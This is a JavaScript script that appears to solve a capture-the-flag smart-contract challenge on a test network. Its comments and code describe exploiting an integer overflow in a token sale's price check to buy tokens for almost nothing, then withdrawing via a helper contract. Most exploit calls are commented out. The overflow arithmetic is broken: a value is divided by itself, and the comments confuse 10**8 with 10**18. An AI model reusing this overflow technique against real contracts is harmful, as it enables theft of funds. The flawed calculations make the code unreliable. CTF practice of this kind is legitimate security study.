const ethers = require('ethers');
const fs = require('fs');
const utils = require('./utils')
const abiFile = './build/contracts/TokenSaleChallenge.json'; // fill
const ctfAbi = './build/contracts/CTFTokenSaleChallenge.json'; // fill
const secrteFile = "../.secret"
const mnemonicFile = "../iBpnG3uuUwI.csv"
const ctfaddress = "0x1D5E5321186713549886B4F1BF1b81B67F408628" // fill
const contractChallangeAddress = "0x7365317814b21d4d1974b85Efd198eF5749E69D1" // fill

let provider = utils.getNetProvider("3")


async function guess(contractCtf, contractChallenge, wallet) {
    // most important sentence is require(msg.value == numTokens * PRICE_PER_TOKEN);
    // we are target is overflow balance which is uint256 max MAX_UINT256 = 
    // 115792089237316195423570985008687907853269984665640564039457584007913129639935
    // and PRICE_PER_TOKEN = 10 ** 18, so  
    // numTokens must most than MAX_UINT256 / (10 ** 8), so puls 1
    // MAX_UINT256 / (10 ** 8) + 1 that's numTokens
    // and the flownum is (10 ** 8) - MAX_UINT256 % (10 ** 8)  that's sendValue
    let max256 = ethers.BigNumber.from(2)
    max256 = max256.pow(256)
    max256 = max256.sub(1)
    let eightyPow = ethers.BigNumber.from(10)
    eightyPow = eightyPow.pow(18)
    let divNum = max256.div(max256)
    let sendToken = divNum + 1

    let modNum = max256.mod(eightyPow)
    let exceed = eightyPow.sub(modNum)
    const exceedStr = exceed.div(eightyPow)
    const exceedNum = exceedStr.toString()
    console.log(exceedNum)

    // buy 1 ether from myself
    // await contractChallenge.buy(1, {from:contractChallenge.adddress,value:ethers.utils.parseEther('1.0')})
    // console.log('bought 1 ether')

    // await contractChallenge.sell(1, {from:contractChallenge.adddress})
    // console.log('sell 1 ether from contract address:' + contractChallenge.adddress)
    
    // await contractChallenge.sell(1, {from:wallet.adddress})
    // console.log('sell 1 ether from myself')

    // buy xxxxx wei from myself
    // await contractCtf.buyOvewrFlowIt(contractChallangeAddress, {value:ethers.utils.parseEther('1')})
    // console.log('bought xxxx ether')

    // await contractCtf.sell(contractChallangeAddress, 1)
    // console.log('sell 1 ether from contract address:' + ctfaddress.adddress)

    var succe = await contractCtf.hasComplete(contractChallangeAddress)
    console.log(succe)
    if(succe){
        await contractCtf.withdraw()
    }
    console.log("uess me success")
}

async function doCapture() {

    let wallet = utils.getMnemonicWallet(mnemonicFile)

    let contractChall = utils.getContract(wallet, abiFile, contractChallangeAddress, provider)
    let contrateCtf = utils.getContract(wallet, ctfAbi, ctfaddress, provider)
    // console.log(contract)
    
    guess(contrateCtf, contractChall, wallet)
}

doCapture()